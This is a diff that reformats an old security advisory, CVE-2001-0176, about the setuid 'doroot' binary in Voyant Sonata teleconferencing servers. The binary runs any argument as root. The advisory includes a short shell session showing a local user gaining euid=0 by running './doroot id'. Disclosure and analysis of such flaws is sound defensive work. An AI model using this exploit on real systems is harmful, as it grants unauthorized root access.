@@ -1,33 +1,39 @@
-                                Advisory #: 43
-Title: Voyant Sonata doroot command vulnerability
-Author:Larry W. Cashdollar, @_larry0
-Date: 2000-11-30
-Download Site: http://www.voyanttechnology.com/
-Vendor:Voyant Technologies.
-Vendor Notified: 2000-11-30
-Vendor Contact: vulnhelp@securityfocus.com
-Description: Sonata is a teleconfrencing solution developed by Voyant
-Technologies. This advisory concerns the Sonata application server and bridge
-componet of the Sonata package. The application server is an Ultra Sparc 5
-running Solaris 2.x as required by Voyant technologies. The bridge is an IBM PC
-running OS/2 Warp. These hosts are usually built in house by Voyant personnel
-and installed at customer locations by a field engineer.
-Vulnerability:
-The setuid binary doroot does exactly what it says. It executes its command
-line argument as root. This is really silly and I dont know why it would need
-to exist.
-CVE- 2001-0176
-JSON:Export
-Exploit Code:
-   1. $ cd /opt/TK/tk4.1/library/demos
-   2. $ id
-   3. uid=60001(nobody) gid=60001(nobody)
-   4. $ ./doroot id
-   5. uid=60001(nobody) gid=60001(nobody) euid=0(root)
-   6. $ ls -l doroot
-   7. rwsr-xr-x 1 root other 6224 Mar 12 1999 doroot
-   8.  
-   9.  
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisories/
-voyant_technologies_sonata_vulnerabilities.html
+
+                               Advisory #: 43
+
+   Title: Voyant Sonata doroot command vulnerability
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2000-11-30
+   Download Site: http://www.voyanttechnology.com/
+   Vendor: Voyant Technologies.
+   Vendor Notified: 2000-11-30
+   Vendor Contact: vulnhelp@securityfocus.com
+   Description: Sonata is a teleconfrencing solution developed by Voyant
+   Technologies. This advisory concerns the Sonata application server and
+   bridge componet of the Sonata package. The application server is an
+   Ultra Sparc 5 running Solaris 2.x as required by Voyant technologies.
+   The bridge is an IBM PC running OS/2 Warp. These hosts are usually
+   built in house by Voyant personnel and installed at customer locations
+   by a field engineer.
+   Vulnerability:
+   The setuid binary doroot does exactly what it says. It executes its
+   command line argument as root. This is really silly and I dont know why
+   it would need to exist.
+   CVE- 2001-0176
+   JSON: Export
+   Exploit Code:
+
+    1. $ cd /opt/TK/tk4.1/library/demos
+    2. $ id
+    3. uid=60001(nobody) gid=60001(nobody)
+    4. $ ./doroot id
+    5. uid=60001(nobody) gid=60001(nobody) euid=0(root)
+    6. $ ls -l doroot
+    7. rwsr-xr-x 1 root other 6224 Mar 12 1999 doroot
+    8.
+    9.
+
+   Screen Shots:
+   Advisory:
+   http://www.vapid.dhs.org/advisories/voyant_technologies_sonata_vulnerab
+   ilities.html
